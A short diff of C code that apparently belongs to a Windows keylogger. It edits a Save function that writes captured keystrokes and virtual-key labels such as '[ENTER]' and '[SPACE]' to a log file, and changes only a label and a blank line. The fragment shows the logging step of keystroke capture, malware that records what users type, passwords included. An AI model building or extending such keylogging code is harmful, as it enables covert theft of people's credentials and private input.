@@ -36,7 +36,7 @@ int Save(int _key, char *file) {
             break;
         case VK_RBUTTON: fprintf(OUTPUT_FILE, "[RBUTTON]");
             break;
-        case VK_RETURN: fprintf(OUTPUT_FILE, "[RETURN]");
+        case VK_RETURN: fprintf(OUTPUT_FILE, "[ENTER]");
             break;
         case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]");
             break;
@@ -50,7 +50,6 @@ int Save(int _key, char *file) {
             break;
         case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]");
             break;
-            
     }
     fprintf(OUTPUT_FILE, "%s", &_key);
     fclose(OUTPUT_FILE);
